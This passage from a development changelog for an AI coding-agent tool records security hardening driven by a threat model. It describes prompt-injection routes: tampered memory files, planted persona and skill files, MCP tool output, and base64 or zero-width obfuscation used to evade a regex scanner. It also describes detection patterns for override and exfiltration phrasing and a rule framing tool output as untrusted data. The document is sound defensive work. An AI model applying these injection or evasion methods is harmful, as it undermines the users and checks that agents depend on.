`minRemainingTokens`) once exhausted — so one expensive or runaway early sub-agent could reduce a
later sibling's allowance to essentially nothing, even though the swarm run wasn't done spawning
its intended workers (STRIDE-A: Denial of Service, CVSS 3.6). Added a `fairShareFraction` (0.2)
constant: once the shared cap is exhausted, `remainingBudget`/`remainingTokens` now floor a
worker's allowance at 20% of the *original* cap rather than the epsilon, so a handful of siblings
can each still get a meaningful floor; the epsilon floor is kept as a fallback for the degenerate
case where 20% of the cap itself rounds to (near) zero. `SpawnConfig` carries no team-size/worker-
count hint, so this is a fixed conservative fraction rather than an exact 1/N split — worst case
total spend across floors alone is bounded at 5x the original cap, an accepted trade against the
fairness gap it closes.
Tests: `internal/swarm/subprocess_test.go` gained `TestRemainingBudgetFairShareFloor`,
`TestRemainingBudgetFairShareFloorFallsBackToEpsilon`, `TestRemainingTokensFairShareFloor`, and an
end-to-end `TestSubprocessSpawnLaterSiblingGetsFairShareFloor` (spawns a worker after a shared
tracker shows the cap already blown past, asserts the reported remaining budget/tokens land at the
fair-share floor instead of the old near-zero epsilon). `go build ./...`, `go test ./internal/swarm/...`,
and `go test -race ./internal/swarm/...` all clean.

Earlier — **P24.19 (FIND-15) — document that local-Ollama traffic is
typically unencrypted.** `internal/provider/openai/openai.go` applies no TLS enforcement specific
to a local base URL, and Ollama's own default configuration binds and serves over plain HTTP on
`127.0.0.1` — on a single-user machine this is no different from any other loopback traffic, but on
a **shared multi-user host** another local account could observe or tamper with daemon↔Ollama
traffic. Not independently actionable in Aegis's own code, since the plaintext behavior originates
from Ollama's own default configuration — remediation is documentation only. `docs/providers.md`'s
"Ollama (recommended for local use)" section gained a "Shared-host note" covering the exposure and
recommending TLS (where Ollama supports it) or a single-user host for sensitive work.

Earlier — **P24.16, P24.17, and P24.18 — the STRIDE-A threat model's Tier 3
third batch, closing out Tier 3 entirely — shipped in parallel via isolated git-worktree
sub-agents** (see [roadmap.md](roadmap.md#priority-order)):

**P24.16 (FIND-29) — extend Windows DACL hardening beyond `daemon.token`.** `daemon.token` got an
explicit, non-inherited, owner-only Windows DACL via a `restrictToOwner` helper
(`internal/server/token_windows.go`/`token_other.go`), but the SQLite session database and
`.aegis/.env` inherited whatever ACL the data/project directory already had — on a shared Windows
host, another local account with read access to that directory could read conversation history or
`.env` secrets, neither of which are encrypted at rest. Extracted the SDDL-based logic
(`"D:PAI(A;;FA;;;OW)"`, same idiom WireGuard for Windows uses) into a new leaf package,
`internal/fsguard` (`RestrictToOwner`, same windows/other build-tag split as before), so
`internal/session` and `internal/config` can call it without creating an import cycle through
`internal/server`; the old server-local `token_windows.go`/`token_other.go` were deleted and
`auth.go`'s `generateAndWriteToken` now calls the shared function. `session.Open`
(`internal/session/session.go`) hardens `sessions.db` and its WAL-mode `-wal`/`-shm` sidecar files
right after `migrate()` succeeds — checkpoint snapshots needed no separate treatment since
`internal/checkpoint` shares the same SQLite connection via `NewStore(db *sql.DB)`. A hardening
failure on the main database file propagates as an `Open` error, matching how `daemon.token` has
always treated a genuine ACL-set failure; a sidecar failure (including "doesn't exist yet", which
`fsguard.RestrictToOwner` treats as a no-op on any file) is only logged, since the sidecars may not
have been created yet at open time and the primary db file being locked down already covers the
bulk of the exposure. `config.loadDotEnv` (`internal/config/config.go`) applies the same hardening
to `.aegis/.env` right after a successful read; because that file is user-owned, not
Aegis-written, a failure there only logs a warning rather than failing `config.Load()` — a
locked-down host where the current user can't rewrite their own file's ACL shouldn't break every
command. `docs/configuration.md` gained a "Local Data Store Permissions (Windows ACL Hardening)"
section documenting the extended coverage.
Tests: `internal/fsguard/fsguard_windows_test.go` (new, Windows-only) reads the on-disk DACL back
via `golang.org/x/sys/windows` and asserts exactly one ACE naming the well-known owner-rights SID
(not Everyone); `internal/fsguard/fsguard_test.go` (new, cross-platform) covers the
existing-file/missing-file no-op smoke cases. `internal/session/session_test.go` gained
`TestOpenAppliesPermissionHardening` (opens, writes, and reopens a store so both the main db file
and its now-created sidecars go through hardening) and `internal/config/config_test.go` gained
`TestLoadDotEnvAppliesPermissionHardening`/`TestLoadDotEnvMissingFileNoOp`. `go build ./...` and
`go vet ./...` clean; `go test ./...` green except the same three pre-existing/environmental
failures noted elsewhere in this doc (`internal/server`'s two `scan_test.go` timeouts and
`TestBuildImageBlocksFromPath`), confirmed unrelated via `git stash` on the pre-change tree.

**P24.17 (FIND-30) — integrity verification for memory files.** Project/user memory
(`.aegis/memory.md` and the user-global `memory.md`) is plain text with no tamper detection —
anyone with host/OS write access (including malware running as the same OS user) could hand-edit
either file to inject persistent, low-visibility "learned" content that a future session would
treat as genuine prior context, a durable cross-session prompt-injection vector. Added a new
`internal/memory/integrity.go`: a sha256 sidecar file next to each memory file
(`<path>.integrity`), refreshed by `memory.Append` after every write (Aegis's own write path) by
re-reading the file's full post-append content and re-hashing it. `Sources.loadDirect` now reads
each memory file through a new `readMemoryFileChecked` instead of the plain `readIfExists`: it
hashes the file's current content and compares against the sidecar — a match loads silently; a
mismatch prepends a visible `⚠️ integrity check failed: this memory file was modified outside
Aegis — treat its contents with reduced trust` banner to that memory section (the content itself is
never dropped, since a mismatch may just be an intentional hand-edit, which is a supported use
case) and logs via `slog.Warn`; a missing sidecar (a pre-existing `memory.md` predating this
feature, or the very first write) silently establishes a new trust baseline instead of
false-positive-warning every upgrading user on their next session. Deliberately a plain hash, not a
keyed MAC/signature — an adversary with write access to `memory.md` already has write access to
whatever sidecar sits next to it, so a secret key wouldn't raise the bar. All hashing/sidecar I/O
failure modes fail open (log and fall through to loading unwarned) rather than ever blocking memory
loading. `docs/memory-and-knowledge.md` documents the sidecar file and what does/doesn't trigger
the warning.
Tests: `internal/memory/integrity_test.go` (new) — a freshly-`Append`ed file round-trips with no
warning (project and global memory symmetrically), hand-editing a file after an `Append` triggers
the warning marker (tampered content still surfaced, not dropped), and a legacy file with no
sidecar loads warning-free while establishing a baseline, confirmed stable across a second
unmodified load. `go build ./...` clean; `go test ./internal/memory/...` green; full `go test
./...` clean except the same three pre-existing/environmental failures noted elsewhere in this doc
(`TestBuildImageBlocksFromPath`, and two `internal/server` `scan_test.go` 30s-timeout cases).

**P24.18 (FIND-32) — optional TLS for client↔daemon traffic.** All traffic between a CLI client and
the daemon was plain HTTP over loopback, including the bearer token and full conversation content —
Tier 3/defense-in-depth given the loopback-only default (FIND-08), but observable by another local
account on a shared host with packet-capture privilege. Chose optional TLS over a Unix-domain-
socket/named-pipe transport, since TLS is one code path across the Windows/macOS/Linux targets this
project supports where a UDS/named-pipe split would need two — and this box (Windows) made the
cross-platform cost of the split concrete rather than theoretical. New opt-in
`server.tls.enabled` config (`internal/config/config.go`'s new `ServerTLSConfig`, default false —
byte-for-byte unchanged behavior when unset) plus optional `cert_file`/`key_file` for an operator-
supplied certificate. When enabled with no cert/key configured, `internal/server/tls.go`'s new
`ensureTLSCert` generates a self-signed ECDSA P-256 certificate on first start and persists it as
`<data_dir>/daemon.crt`/`daemon.key` — the same generate-once-reuse-unless-missing convention
`generateAndWriteToken` uses for `daemon.token` — and the private key gets the same Windows DACL
hardening as the auth token via `fsguard.RestrictToOwner`, the shared leaf package P24.16 (FIND-29,
above) extracted for exactly this kind of cross-package reuse; `tls.go` originally called a
server-package-local `restrictToOwner` (the only copy that existed in this item's own worktree,
built independently and in parallel), and was updated to the shared package while reconciling the
three P24.16/P24.17/P24.18 worktrees onto `main`. `internal/server/server.go`'s `ListenAndServe` calls
`ListenAndServeTLS("", "")` with the loaded certificate already set on `http.Server.TLSConfig` when
TLS is enabled, `ListenAndServe()` unchanged otherwise. Client side: new `client.WithTLS(certPath)`
(`internal/client/client.go`) pins the daemon's certificate into a dedicated `*x509.CertPool` —
`InsecureSkipVerify` is never used, so an unrecognized certificate fails the TLS handshake closed
rather than silently connecting — and a new `client.NewFromConfig(cfg)` convenience constructor
centralizes the base-URL/bearer-token/TLS wiring in one place (confirmed no import cycle: `internal/
config` imports nothing under `internal/`). All ~9 `client.New(cfg.Server.Addr).WithTokenFile(...)`
call sites across `internal/cli/{root,acp,mcpserve,sessions,ui}.go` now go through it instead of
repeating the wiring. `aegis ui`'s printed URL (`webUIURL`) switches to `https://` when TLS is
enabled and the command prints a one-line "browser will warn about the self-signed certificate —
this is expected" notice, since a browser (unlike the pinned CLI clients) has no way to trust the
self-signed cert automatically.
Tests: `internal/server/tls_test.go` (new) — `TestListenAndServeTLSRoundTrip` starts a real
`ListenAndServe` with TLS enabled on an ephemeral loopback port, confirms the cert/key files are
written, a client pinned via `WithTLS` reaches `/healthz` successfully, and an unpinned
`https://` client fails closed against the self-signed cert; `TestListenAndServeTLSDisabledUnchanged`
confirms no cert/key files are written and plain HTTP still works when TLS is left off (the
default). `go build ./...` clean; `go test ./...` green except the same three pre-existing/
environmental failures noted elsewhere in this doc (`TestBuildImageBlocksFromPath`,
`TestHandleScanDefaultsToWholeWorkspace`, `TestHandleScanImageRoutesToImageScan`), confirmed
unrelated via `git stash` on the pre-change tree. Docs: `docs/configuration.md` (`server.tls.*` full
reference plus an `AEGIS_SERVER_TLS_ENABLED` env-var row) and `docs/security_scan.md` (new
"Client<->Daemon Transport" section covering the threat model, what TLS does and does not protect
against, and its off-by-default posture).

Earlier — **P24.11, P24.12, and P24.13 — the STRIDE-A threat model's Tier 3
second batch — shipped in parallel via isolated git-worktree sub-agents** (see
[roadmap.md](roadmap.md#priority-order)):
**P24.11 (FIND-07) — allowlist/trust-gate LSP server commands.** `internal/lsp/client.go`'s
`NewClient` passed a project/user-config-supplied `command`/`args` straight to
`exec.CommandContext` with no allowlist or verification — a malicious project `.aegis/config.yaml`
could point the LSP client at an arbitrary binary for code execution the first time LSP integration
activated. All configured LSP servers start eagerly and synchronously at daemon construction time
(`internal/server/server.go`, inside `server.New`), before any TUI/session/interactive approver
exists, which ruled out a live TOFU-confirmation prompt — there's no human present at the point
that matters. Added a built-in allowlist of common LSP server binary basenames
(`internal/lsp/trust.go`, matched case-insensitively against just the basename, not the full path)
plus an explicit per-server `lsp[].trust: true` config opt-in for anything else; `Manager.Start`
now calls a new pure `checkTrusted` before spawning and refuses (with an actionable error naming
the config knob) instead of exec'ing an unrecognized, non-trusted command.
Tests: `internal/lsp/trust_test.go` (new) — allowlisted basename, allowlisted-via-full-path
(including Windows-style), non-allowlisted refused, non-allowlisted allowed with `trust: true`,
case-insensitivity. `go build ./...` clean; `go test ./internal/lsp/... ./internal/config/...
./internal/server/...` green except the same three pre-existing/environmental `internal/server`
failures noted elsewhere in this doc.
**P24.12 (FIND-09) — opt-in secret redaction pass for tool-read content.** Full conversation and
tool-read file content streams to whichever provider is configured with no content-filtering step
— for a cloud provider (Anthropic, OpenAI, any OpenAI-compatible cloud endpoint), a secret embedded
in a file a tool reads goes to that third party unmasked. Added a new `security.RedactText`
(`internal/security/redact.go`), extending the FIND-13 gitleaks-backed detection machinery
(`ScanText`) to also capture the literal matched secret string from gitleaks' JSON report and mask
each occurrence to `[REDACTED:<RuleID>]` — same fail-open posture as `ScanText` (no gitleaks on
PATH, or any scan error, leaves the text unchanged rather than blocking). New opt-in
`security.redact_secrets` config flag (off by default); when set, `engine.executeTool`
(`internal/engine/engine.go`) runs every successful read-capability tool result through it before
the result re-enters the model's context, logging a count at Info rather than ever blocking the
call. `docs/providers.md` gained a "Data Exposure & Redaction" section documenting local-Ollama as
the no-exposure alternative for sensitive codebases.
Tests: `internal/security/redact_test.go` (new, no-gitleaks-on-PATH + live AWS-key-pattern cases,
both exercised for real on this box) and `internal/engine/redact_test.go` (new, stubs the
`redactSecretsFn` seam so it runs unconditionally in CI without a gitleaks dependency). `go build
./...` clean; `go test ./internal/security/... ./internal/engine/... ./internal/server/...` green
except the same three pre-existing failures.
**P24.13 (FIND-10) — detect zero-width/base64-obfuscated injection attempts.** The shared
opt-in MCP/web-fetch prompt-injection heuristic (`trust.ScanForInjection`, ~14 plain regexes) was
trivially bypassed by encoding a payload or inserting zero-width/invisible Unicode characters
inside a trigger word. `ScanForInjection` now additionally matches the same regex set against (a) a
copy of the content with Unicode `Cf` (zero-width/invisible format) characters stripped, and (b)
the decoded text of any base64-looking substring (20+ contiguous base64-alphabet characters) that
decodes to valid UTF-8 — hits inside decoded content are labeled distinctly so the surfaced warning
makes clear the match was inside an encoded payload. The original content handed to `trust.Wrap` is
never altered, only throwaway matching copies are. `docs/mcp-trust-boundary.md`'s "What this does
not do" bypass list was updated to reflect the new boundary (homoglyphs, translation, other
encodings, and multi-call-split payloads still aren't caught), and a new "Evaluating a model-based
classifier" section documents why a model-based classifier is deferred rather than built now — it
would add a real network/latency/cost dependency and a new attackable trust surface, with no
evidence yet that the heuristic is inadequate for its defense-in-depth role — with a concrete
revisit trigger (an opt-in `scan_output: model` mode if false-negative reports accumulate).
Tests: `internal/trust/trust_test.go` gained zero-width-obfuscation, base64-encoded-payload, and
benign-base64ish-no-false-positive cases alongside the existing pattern tests. `go build ./...`,
`gofmt`, `go vet` clean; `go test ./internal/trust/... ./internal/mcp/... ./internal/tool/...`
green.
All three merged independently (`go build ./...` and the full `go test ./...` re-verified clean
after each merge and after all three landed together — same three pre-existing/environmental
`internal/server` failures, confirmed unrelated via `git stash` on the pre-change tree by two of
the three sub-agents independently).
Earlier — **P15.2, the daemon config-mutation endpoints, shipped via an
isolated git-worktree sub-agent — closing out Tier 3's first batch (alongside P21.2 and P24.10,
below), 2026-07-10** (see [roadmap.md](roadmap.md#priority-order)):
**P15.2 — new daemon config-mutation endpoints.** The web UI's planned sandbox/security/skills
config panels and security-tooling admin panel (P15.6/P15.7) had no HTTP surface to talk to —
every config mutation (sandbox backend, security scanner policy, `skills.builtin_enabled`, the
hardened profile, guided scanner installs) was CLI/TUI-only. Added seven endpoints:
`GET/PATCH /config/sandbox`, `/config/security`, `/config/skills`, `POST /config/harden`,
`GET /security/status`, `GET /security/baseline`, `POST /security/install`
(`internal/server/config.go`, `internal/server/security_admin.go`). All PATCH handlers write
through the existing `config.Patch{Global,Project}*` functions rather than hand-rolling YAML
mutation; the sandbox/security PATCH bodies use pointer fields for genuine partial-update semantics
since the underlying patches otherwise replace their whole config block. `aegis harden`'s
cap-computation was extracted from `internal/cli/harden.go` into `config.ComputeHardenPlan`
(`internal/config/harden.go`) so the CLI and the new `POST /config/harden` share one source of
truth instead of duplicating the cap thresholds and "leave an already-hardened knob alone"
exceptions; harden and install both require an explicit `{"confirm": true}` before writing/running
anything, since there's no terminal to show the CLI's `[y/N]` prompt. `GET /security/status` mirrors
`internal/tui/securityconfig.go`'s tool-probe/status wording exactly so a future web panel matches
the TUI. New wire types in `internal/api/api.go` plus typed `internal/client/client.go` methods
follow the existing `Scan`/`Knowledge`/`Debate` client idiom. Scope selection (project vs. global
config) defaults to project when the daemon's workspace has a `.aegis/` directory, else global,
overridable per-request — flagged as a judgment call worth a second look if project/global scoping
ever needs to be more explicit.
Tests: `internal/server/config_test.go` (new) — GET defaults, PATCH apply+persist+partial-update,
project/global scope resolution including auto-detection, unknown-scope rejection, harden
preview/apply/idempotency; environment-tolerant smoke tests for install/status/baseline (no scanner
binary required, matching `scan_test.go`'s existing convention on this box). `go build ./...`,
`go vet ./...` clean; full `internal/server`/`config`/`security`/`cli`/`api`/`client` suites green
except the same three pre-existing/environmental failures noted elsewhere in this doc (confirmed
via `git stash` to fail identically without this change).
Earlier the same day — **P21.2, tool-call cards, shipped via an isolated git-worktree
sub-agent** (see [roadmap.md](roadmap.md#priority-order)):
**P21.2 — tool-call cards (in-place updating block).** A tool call used to render as two
independent, static transcript items — `renderToolCall` appended at `KindToolCall`,
`renderToolResult` appended separately at `KindToolResult` with no link back to the call — so every
call looked "finished" the instant it started, and concurrent tool calls (`engine.runTools` runs
read/network tools concurrently, and results don't necessarily land in call order) relied on a
same-name FIFO queue that could silently cross-attribute a result, or a `read_file`'s highlighted
path, to the wrong call. The real fix needed a stable per-call identity that didn't exist on the
wire: added `ToolID` (the provider's `tool_use` ID) to `engine.Event`/`api.Event`, populated at
every emission site including the panic-recovery path and threaded through
`messages.go`'s `toAPIEvent`. The TUI (`internal/tui/tui.go`) now `AppendBlock`s a pending card at
`KindToolCall`, keyed by `ToolID` in a `pendingTools` map, and `SetItemRaw`s it to ok/err in place
at `KindToolResult` instead of appending a second item; `pendingReadPaths` moved off the same
same-name-FIFO pattern onto the same keyed map, fixing the same latent cross-talk bug for
concurrent reads. `resolveStuckToolCards` finalizes any still-pending cards to an "interrupted"
state from `KindError` and from `streamClosedMsg` (the only signal guaranteed to fire on every run
end, since a client-initiated cancel hits neither `KindError` nor `KindDone`). New
`renderToolCardPending`/`-Done`/`-Stuck` in `internal/tui/toolview.go` wrap the existing
call/diff-preview renderers unchanged, reusing the existing `shimmerText` animation primitive for
the pending state rather than inventing a new one. Session replay (`loadHistory`) was deliberately
left rendering call+result as two static items — both halves are already known at replay time, so
combining them would be cosmetic, not a fix.
Tests: `internal/tui/toolcard_test.go` (new) — pending→ok, pending→err, two concurrent calls
resolving independently out of order with no cross-talk, a turn-error resolving a stuck card,
`streamClosedMsg` resolving a stuck card, and the ID-less FIFO fallback. `go build ./...`,
`go vet ./...` clean; `go test ./internal/tui/... ./internal/engine/... ./internal/api/...` green.
No interactive PTY was available to visually verify the pending→ok/err transition in a real
terminal — noted explicitly rather than claimed.
Earlier the same day — **P24.10, the first of the STRIDE-A threat model's Tier 3 findings,
shipped via an isolated git-worktree sub-agent** (see [roadmap.md](roadmap.md#priority-order)):
**P24.10 (FIND-06) — document Docker/Podman-socket privilege equivalence, recommend rootless
backends.** FIND-06 flagged that Docker/Podman socket access is privilege-equivalent to local root
(Docker) or the invoking user (rootful Podman), and that `internal/sandbox/docker.go` showed no
capability-dropping. Re-verified against current code first: `ociRunArgs` already applies
`--cap-drop=ALL` and `--security-opt=no-new-privileges` unconditionally to every docker/podman run,
so that half of the finding was already shipped — this change didn't touch it. What remained open
was the doc gap (the inherent socket-level privilege equivalence, which no container-run flag can
close) and rootless-backend guidance. Added a "Docker/Podman socket privilege equivalence"
subsection to `docs/security_scan.md` and new `sandbox.SocketRuntime`/`SocketPrivilegeNotice`
helpers, logged once via `Server.SelectSandbox` when a docker/podman backend is selected — no
automatic rootless-vs-rootful detection, since no reliable cross-platform client-side signal exists
without a fragile `docker/podman info` parse (documented as a deliberate scope decision, not an
oversight).
Tests: `internal/sandbox/docker_test.go` (new `TestSocketRuntime`/`TestSocketPrivilegeNotice`);
`go build ./...`, `go vet ./...` clean, `go test ./internal/sandbox/... ./internal/cli/...` and the
`internal/server` `TestSelectSandbox*` suite green.
Earlier the same day — **P24.5–P24.9, the STRIDE-A threat model's Tier 2 quick wins, all
shipped in parallel via isolated git-worktree sub-agents** (see
[roadmap.md](roadmap.md#priority-order)):
**P24.5 (FIND-11) — count and log repeated invalid-bearer-token attempts.** `authMiddleware`
(`internal/server/auth.go`) previously rejected a request with a missing/wrong `Authorization:
Bearer` header with a 401 and nothing else — no signal that the daemon was being probed. Added a
process-wide `atomic.Uint64` counter on `Server` (deliberately not a per-IP map, so the audit fix
itself can't become a memory-growth DoS vector) and a `slog.Warn` on the first failure and every
5th thereafter, logging remote address, path, and cumulative count — never the attempted token.
**P24.6 (FIND-13) — scan PR titles/bodies for secrets before `gh pr create`.** `git_pr`
(`internal/tool/builtin/gitpr.go`) previously sent the model-composed title/body straight to GitHub
with no inspection. `internal/security` gained an exported `ScanText` (factored out of the existing
`gitleaksScanner`'s host-scan path) that writes text to a temp file and runs gitleaks against it —
silently a no-op if the binary isn't on PATH, never a hard dependency. `git_pr` now calls it before
pushing or creating the PR and refuses (naming the rule/location) if it finds anything; a scan
error itself fails open, matching how the rest of the security tooling treats gitleaks as
best-effort. **P24.7 (FIND-16) — distinguish `OutputGuard` fail-open from a genuine pass.**
`guard.Func` previously returned a bare `(ok bool, reason string)` — a genuine PASS and a swallowed
transport error were byte-for-byte identical, and the engine emitted nothing at all on success
either way. Added `guard.Status` (`passed`/`failed`/`skipped_transport_error`) as a third return
value; the engine (`internal/engine/engine.go`) now emits a `KindGuard` event with that status on
every path, including the previously-silent success path. **P24.8 (FIND-31) — audit
`internal/security/install.go`'s installer-script argument construction.** Verification-only:
traced every `Install` map entry (`internal/security/method.go`, all compile-time literals),
`shellInvocation`, and `exec.CommandContext(shell, args...)` — confirmed the install command always
reaches the shell as a single, unmodified argv element, never re-split or built from
runtime/config-controlled data. Locked in with three regression tests; found one latent,
currently-unreachable issue (unquoted `distro` arg in `sandbox.WSLInstallCommand`, dead code today
since `install.go`'s only call site hardcodes `""`) tracked as new roadmap item P24.22. **P24.9
(FIND-34) — dedicated cron-execution audit log.** Cron firings were only visible via transient
`slog` lines and the generic task-manager view. Added a `cron_runs` table (job ID, fired-at,
status — `ok`/`error`/`blocked`, truncated combined output) to `cron.Store`, wired through a new
`newCronRunFunc` (extracted from the inline closure in `Server.New`) that records every fire
attempt including ones the P24.3 permission gate blocks, and a new read-only `cron_history` tool
mirroring `cron_list`'s shape.
Tests: `internal/server/server_test.go` (new `TestServerInvalidAuthAttemptsLoggedAndCounted`),
`internal/security/scantext_test.go` (new), `internal/tool/builtin/gitpr_test.go`,
`internal/guard/guard_test.go`, `internal/engine/guard_test.go`, `internal/security/install_test.go`
(new regression tests), `internal/cron/cron_test.go`, `internal/tool/builtin/cron_test.go`,
`internal/server/cron_test.go` (new). `go build ./...`, `go vet ./...` clean; `go test ./...` green
except the same three pre-existing/environmental failures noted below (confirmed present before any
of this work).
Earlier the same day — **P24.1–P24.4, the STRIDE-A threat model's Critical/Important
findings (Tier 1), all shipped same day as the pass that produced them**:
**P24.1 (FIND-01) — bind the `/ui` page-token exchange to the browser that loaded the page.**
Previously `GET /ui`'s minted page token and `POST /auth/exchange` had no check on *who* was
asking — any local process reaching the loopback port, not just the operator's own browser, could
mint and redeem a page token for the real daemon bearer token, collapsing the whole auth model to
"can this process reach 127.0.0.1." Added a double-submit CSRF nonce (`internal/server/auth.go`):
`mintPageToken` now also generates a nonce, set both as an `HttpOnly`/`SameSite=Strict` cookie
(`aegis_ui_csrf`) and baked into the served HTML (`data-csrf-token`); `handleAuthExchange` requires
the cookie and an explicit `X-Aegis-CSRF` header (which only same-origin JS reading the page's own
DOM could construct) to match the nonce bound to the presented page token. This closes the
realistic instance of the gap — a hostile cross-origin webpage/tab driving the flow blind, which
can't read an `HttpOnly` cookie or this page's response body (no CORS grant, `X-Frame-Options:
DENY` blocks framing) — while a raw local process with direct HTTP access remains an accepted
residual risk, the same class as reading `daemon.token` off disk for a same-OS-user adversary.
Frontend (`internal/server/webui/frontend/src/api.ts`) sends the header; `dist/` rebuilt via
`npm run build` and committed. **P24.2 (FIND-02) — authenticate `aegis mcp-serve` and the ACP
server.** Both accepted commands from any local process able to write to the subprocess's stdin
with no credential check. `aegis acp` now implements ACP's real `authenticate` method for real: set
`AEGIS_ACP_TOKEN` in the editor's launch environment and `initialize` advertises a `shared_secret`
auth method; `session/new`/`session/prompt` are denied until the client authenticates with a
matching token (`internal/acp/agent.go`, constant-time compare). `aegis mcp-serve` gets an
equivalent, MCP-spec-external `aegis/authenticate` request gating `tools/call` the same way, opt-in
via `AEGIS_MCP_TOKEN` (`internal/mcpserver/server.go`). Both default to today's no-auth behavior
when the env var is unset — zero breaking change for every existing integration. **P24.3 (FIND-03)
— gate cron firings through the daemon's permission mode.** Scheduled jobs previously ran
unattended shell commands via `cronShellRunner` with no gate of any kind, regardless of permission
mode. `internal/cron.Job` gained an `AutoApprove` field (persisted, migrated via `ALTER TABLE ...
ADD COLUMN`); the fire-time closure in `internal/server/server.go` now evaluates
`permission.Policy{Mode: currentMode}.Decide(tool.CapExecute)` fresh on every tick — plan mode
blocks the job outright, build mode requires the job's explicit `auto_approve` opt-in (mirroring
`mcp_server.auto_approve`) since no one is present to answer an approval prompt, auto mode is
unchanged. `cron_create`'s new `auto_approve` argument and `cron_list`'s `[auto_approve]` marker
make the opt-in visible to the model. **P24.4 (FIND-05) — wrap persona/skill file bodies as
untrusted content.** Project/user `.aegis/personas/*.md` and `.aegis/skills/*.md` files are
arbitrary content from disk — a compromised dependency or cloned project could plant one to inject
instructions into every session that loads it — and were spliced into the system prompt verbatim.
`parsePersonaFile` (`internal/persona/load.go`) and `appendFromDir` (`internal/skills/skills.go`)
now wrap a file-loaded persona's `System` prompt / a project-or-user skill's body in the same
`internal/trust.Wrap` provenance marker used for MCP/web output (FIND-04/P21.6) before it can reach
the model — built-in personas/skills (compiled into the binary) are left unwrapped since they
aren't attacker-reachable. Unlike MCP/web wrapping, the heuristic injection scan is left off here
(`scan=false`): this content re-injects every session, and persona/skill prose routinely discusses
its own instructions/role, which the scan's patterns (e.g. `\bsystem prompt\b`) flag as false
positives on entirely benign text — caught by `TestPersonaNewThenShowRoundTrip` tripping on the
persona scaffold's own boilerplate. `docs/mcp-trust-boundary.md` extended to cover this.
Tests: `internal/server/webui_test.go` (new `TestAuthExchangeRejectsMismatchedCSRF`),
`internal/mcpserver/server_test.go`, `internal/acp/agent_test.go`, `internal/cron/cron_test.go`,
`internal/persona/load_test.go`, `internal/skills/skills_test.go`. `go build ./...`, `go vet ./...`
clean; `go test ./...` green except the same three pre-existing/environmental failures noted below
(confirmed present before any of this work).
Earlier the same day — **Tier 2 high-visibility wins shipped**, both in parallel via
isolated git-worktree sub-agents:
**P21.3 — streaming caret.** A blinking write-head caret (`█`) at the end of live-streaming
assistant text, so a long reply reads as "alive" rather than "redrawing." Rendered in
`refresh()` (`internal/tui/tui.go`): the caret is appended directly after the last rendered
character of the live tail — trimming and restoring glamour's trailing newline so it lands at
the true write-head rather than on its own blank line — and blinks on the pre-existing
`animStep` tick that already drives the "thinking" shimmer, so no new ticker was introduced.
Only shown while streaming with non-empty live text; never baked into the persisted transcript.
**P22.3 — Esc-Esc backtrack + `/fork`.** A new `POST /sessions/{id}/fork` endpoint
(`internal/server/sessions.go`) creates a new session copying the source session's
system/mode/persona and messages — optionally truncated to a checkpoint's cut point, the same
`Seq` boundary `/rewind`'s conversation scope uses — without mutating the source. `/fork [n]`
mirrors `/rewind`'s checkpoint numbering (no arg forks the current end of the conversation as a
sandbox branch point); pressing Esc twice while idle with an empty input box (mirroring the
existing streaming double-tap-to-cancel detection) opens a picker
(`internal/tui/backtrackpicker.go`) of prior user turns, forks at the selected turn, switches
into the new session (reusing the Ctrl+Y session-switch path), and pre-fills the input box with
the original message text for editing before resending.
**P21.5 — daemon resource ceilings.** `sessionSems` capped runs to one-per-session but had no
global cap on total concurrent runs and no bound on SSE buffer growth — a live gap now that
`aegis mcp-serve` exposes sessions to external MCP clients, not just a theoretical one. Added a
non-blocking global run semaphore (`Server.runSem`, `internal/server/messages.go`) that rejects a
request beyond `server.max_concurrent_runs` with an immediate 429 instead of queuing it; an
optional per-run wall-clock ceiling (`server.max_run_duration_sec`) via `context.WithTimeout`
around the run context, reusing the engine's existing clean-cancellation path; and a new
`sseWriter` (`internal/server/sse.go`) that decouples the engine's event-producing goroutine from
how fast the HTTP client actually reads, dropping the oldest queued event on overflow
(`server.sse_buffer_size`, default 256) rather than growing memory or blocking the producer. All
three configurable via matching `AEGIS_SERVER_*` env vars, default to unlimited/256 so existing
deployments are unaffected. **P15.12 — harden the `/ui` token-injection mechanism.** `GET /ui`
previously injected the daemon's real, long-lived auth token straight into HTML shell source — any
local process reaching the loopback port with no `Origin` header (so the origin guard didn't apply)
got that standing secret in cleartext, replayable for the daemon's whole lifetime. `handleWebUI`
now mints a random single-use "page token" (32 bytes, 60s TTL — `mintPageToken`,
`internal/server/auth.go`) and injects that instead; a new `POST /auth/exchange` endpoint (exempt
from the auth check for the obvious reason, still origin-guarded) redeems it exactly once — deleted
from the server-side map on first read regardless of outcome — and returns the real token, which
the frontend now fetches on load (`internal/server/webui/frontend/src/api.ts`) before making any
other API call, using it exactly as before thereafter. **P21.6 — MCP tool output trust boundary.**
MCP tool output flowed back into model context completely unfiltered despite MCP tools already
being capability-gated — a compromised MCP server was an unguarded prompt-injection vector. Added
an always-on provenance marker (`internal/mcp/trust.go`, `wrapUntrusted`) wrapping every
`tools/call`/`resources/read`/`prompts/get` result in an `<mcp_untrusted_output>` frame naming the
source server and instructing the model to treat the content as untrusted data, not instructions —
no configuration needed. Layered on top: an opt-in per-server heuristic scan
(`scan_output` on `MCPServerConfig`, mirroring the existing per-server `capability` field) that
flags prompt-injection-shaped output (ignore-prior-instructions phrasing, role-override attempts,
fake system-prompt tags, secret-exfiltration patterns) with a `[SECURITY WARNING]` line inside the
same frame — flagged, never silently dropped, matching the engine's existing non-fatal
`notice`-event convention. New `docs/mcp-trust-boundary.md` documents the boundary end to end.
Tests: `internal/server/limits_test.go`, `internal/config/config_test.go`,
`internal/server/webui_test.go`, `internal/mcp/trust_test.go`. `go build ./...`, `go vet ./...`
clean; `go test ./...` green except three pre-existing/environmental failures on this box
(`TestBuildImageBlocksFromPath`, and two `scan_test.go` 30s-timeout tests) confirmed unrelated —
each agent verified via `git stash` that they failed identically before its change. P21.5/P21.6's
track is fully shipped (no open items remain); P15.12's track is covered in
[roadmap.md](roadmap.md#open-work--p15-web-ui-parity-with-the-tui).
Earlier, 2026-07-08 — **`/threat-model` framework picker** (follow-up polish to P13.6:
a recognized leading framework name skips the clarifying question, otherwise a picker dialog opens
listing all six with descriptions; see the P13.6 section below) shipped after **P23**
(local-model context-window truth: Ollama detection, proactive-compaction notices, incremental
threat-model writing); see its section below.
Earlier the same day — **P22.1** (`/diff` command), **P22.4** (Ctrl+R input-history
search), and **P22.2** (`/review` read-only review mode) shipped from the same-day Codex CLI
evaluation.
**P22.1** adds a no-model-turn `/diff [--staged] [path]` — same pattern as `/scan` — showing the
working-tree git diff (tracked changes vs `HEAD`, or `--staged` for just the index) plus a
